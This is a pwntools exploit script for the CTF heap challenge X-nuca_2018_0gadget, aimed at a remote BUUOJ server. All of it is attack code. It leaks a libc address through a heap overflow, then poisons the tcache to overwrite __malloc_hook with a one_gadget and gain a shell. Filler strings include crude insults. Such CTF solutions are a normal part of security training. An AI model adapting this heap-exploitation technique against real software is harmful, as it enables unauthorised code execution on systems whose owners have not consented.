from pwn import *
r = remote('node3.buuoj.cn',29000)
#r = process('./X-nuca_2018_0gadget')
elf = ELF('./X-nuca_2018_0gadget')
libc = ELF('/libc-2.27.so')

def add(size,title,content):
	r.recvuntil('Your choice: ')
	r.sendline('1')
	r.recvuntil('note size: ')
	r.sendline(str(size))
	r.recvuntil('the title: ')
	r.sendline(title)
	r.recvuntil('the content: ')
	r.sendline(content)
	r.recvuntil('REMARK: ')
	r.sendline('nmsl')

def free(index):
	r.recvuntil('Your choice: ')
	r.sendline('2')
	r.recvuntil('to delete: ')
	r.sendline(str(index))
	r.recvuntil('REMARK: ')
	r.sendline('nmsl')

def show(index):
	r.recvuntil('Your choice: ')
	r.sendline('3')
	r.recvuntil('to show: ')
	r.sendline(str(index))
	r.sendline('nmsl')


add(0x90,'fuck','nmsl')#0
add(0x90,'fuck','nmsl')#1 unsortedbin
add(0x40,'a'*0x90,'nmsl')#2
add(0x90,'fuck','nmsl')#3
add(0x90,'fuck','nmsl')#4
add(0x90,'fuck','nmsl')#5
add(0x90,'fuck','nmsl')#6
add(0x90,'fuck','nmsl')#7
add(0x90,'fuck','nmsl')#8
add(0x90,'fuck','nmsl')#9
free(0)
for i in range(3,9):
	free(i)
free(1)
show(2)

r.recvuntil('note content: ')
libc_base = u64(r.recv(6).ljust(8,'\x00'))-96-0x10-libc.sym['__malloc_hook']
one = libc_base+0x4f322
malloc_hook = libc_base+libc.sym['__malloc_hook']
log.success(hex(libc_base))
log.success(hex(malloc_hook))

add(0x40,'wdnmd','nmsl')
add(0x40,'b'*0x90,'nmsl')
add(0x40,'wdnmd','nmsl')
free(0)
free(1)
add(0x40,'wsnd',p64(malloc_hook))
add(0x40,'wsnd',p64(malloc_hook))
add(0x40,'wsnd',p64(one))
r.interactive()